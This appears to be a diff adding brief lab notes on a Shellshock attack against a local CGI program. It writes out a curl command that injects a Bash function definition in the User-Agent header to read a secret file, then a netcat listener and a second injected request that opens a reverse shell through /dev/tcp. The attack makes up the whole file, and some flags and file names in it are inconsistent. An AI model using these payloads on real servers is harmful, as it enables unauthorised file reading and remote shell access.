@@ -1,0 +1,12 @@
+$ curl -A "() { got you; }; \
+echo Content_type: text/plain; echo; /bin/cat /tmp/secret_file"
+http://localhost/cgi-bin/myprog.c
+
+# reverse shell
+$ nc -lv 9090
+# next
+$ curl -a "() { echo got you; }; \
+> echo Content_type: text/plain; echo; \
+> /bin/bash -i > /dev/tcp/localhost/9090 0<&1 2>&1" \
+> http://localhost/cgi-bin/myprog.cgi
+# You will get a promt from the remote machine. You now a reverse shell.
